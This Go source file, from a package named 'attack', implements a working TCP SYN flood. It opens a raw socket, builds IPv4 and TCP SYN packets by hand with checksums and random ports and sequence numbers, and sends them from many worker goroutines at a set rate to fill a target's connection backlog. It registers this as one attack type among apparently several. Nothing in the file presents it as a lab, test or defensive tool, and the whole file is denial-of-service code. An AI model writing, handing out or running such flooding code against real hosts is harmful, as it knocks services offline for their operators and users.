package attack

import (
	"context"
	"encoding/binary"
	"fmt"
	"math/rand/v2"
	"net"
	"runtime"
	"sync"
	"sync/atomic"
	"syscall"
)

// synFlood sends raw TCP SYNs to the target port, filling the backlog queue.
// Needs a raw socket: root (or CAP_NET_RAW) on Linux, and typically root on macOS.
// On Linux we build the full IP header ourselves; on BSD/macOS the kernel
// supplies it, so only the TCP header goes out.
type synFlood struct {
	packets, bytes, errs atomic.Uint64
}

func init() { Register("syn", func() Attack { return &synFlood{} }) }

func (s *synFlood) Name() string { return "syn" }

func (s *synFlood) Start(ctx context.Context, opts Options) error {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		return fmt.Errorf("raw socket: %w — SYN flood needs root; try --type udp or hold without it", err)
	}
	defer syscall.Close(fd)

	includeIPHeader := runtime.GOOS == "linux"
	src := defaultLocalIP()
	dst4 := opts.Target.To4()

	workers := opts.Workers
	if workers <= 0 {
		workers = autoWorkers()
	}
	interval := perWorkerInterval(workers, opts.PPS)

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			buf := make([]byte, 40) // IP(20) + TCP(20)
			paceLoop(ctx, interval, func() {
				fillSyn(buf, src, dst4, opts.Port)
				out := buf
				if !includeIPHeader {
					out = buf[20:] // kernel fills the IP header on BSD/macOS
				}
				if _, err := syscall.Write(fd, out); err != nil {
					s.errs.Add(1)
					return
				}
				s.packets.Add(1)
				s.bytes.Add(40)
			})
		}()
	}
	wg.Wait()
	return nil
}

func (s *synFlood) Stats() Stats {
	return Stats{Packets: s.packets.Load(), Bytes: s.bytes.Load(), Errors: s.errs.Load()}
}

// fillSyn builds a 40-byte IP+TCP SYN packet in buf.
func fillSyn(buf []byte, src, dst net.IP, dport uint16) {
	// IPv4 header.
	buf[0] = 0x45 // v4, IHL=5
	buf[1] = 0    // ToS
	binary.BigEndian.PutUint16(buf[2:4], 40) // total length
	binary.BigEndian.PutUint16(buf[4:6], uint16(rand.Uint32()))
	binary.BigEndian.PutUint16(buf[6:8], 0x4000) // don't fragment
	buf[8] = 64                                  // TTL
	buf[9] = 6                                  // TCP
	binary.BigEndian.PutUint16(buf[10:12], 0)   // checksum, filled below
	copy(buf[12:16], src.To4())
	copy(buf[16:20], dst.To4())
	binary.BigEndian.PutUint16(buf[10:12], csum16(buf[0:20]))

	// TCP header.
	sport := uint16(1024 + rand.Uint32()%64512)
	binary.BigEndian.PutUint16(buf[20:22], sport)
	binary.BigEndian.PutUint16(buf[22:24], dport)
	binary.BigEndian.PutUint32(buf[24:28], rand.Uint32()) // seq
	binary.BigEndian.PutUint32(buf[28:32], 0)            // ack
	buf[32] = 5 << 4     // data offset: 20 bytes, no options
	buf[33] = 0x02       // SYN
	binary.BigEndian.PutUint16(buf[34:36], uint16(512+rand.Uint32()%1024)) // window
	binary.BigEndian.PutUint16(buf[36:38], 0) // checksum, filled below
	binary.BigEndian.PutUint16(buf[38:40], 0) // urg ptr

	dst4 := dst.To4()
	pseudo := []byte{
		src.To4()[0], src.To4()[1], src.To4()[2], src.To4()[3],
		dst4[0], dst4[1], dst4[2], dst4[3],
		0, 6, 0, 20,
	}
	binary.BigEndian.PutUint16(buf[36:38], csum16(pseudo, buf[20:40]))
}

// defaultLocalIP picks the first non-loopback IPv4 address of the host.
func defaultLocalIP() net.IP {
	ifaces, err := net.Interfaces()
	if err == nil {
		for _, ifc := range ifaces {
			if ifc.Flags&net.FlagUp == 0 || ifc.Flags&net.FlagLoopback != 0 {
				continue
			}
			addrs, _ := ifc.Addrs()
			for _, a := range addrs {
				if ipnet, ok := a.(*net.IPNet); ok {
					if ip4 := ipnet.IP.To4(); ip4 != nil {
						return ip4
					}
				}
			}
		}
	}
	return net.IPv4(127, 0, 0, 1)
}

// csum16 computes the internet checksum (RFC 1071) over the given parts.
func csum16(parts ...[]byte) uint16 {
	var sum uint32
	for _, d := range parts {
		if len(d)%2 == 1 {
			pad := make([]byte, len(d)+1)
			copy(pad, d)
			d = pad
		}
		for i := 0; i < len(d); i += 2 {
			sum += uint32(binary.BigEndian.Uint16(d[i : i+2]))
		}
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}
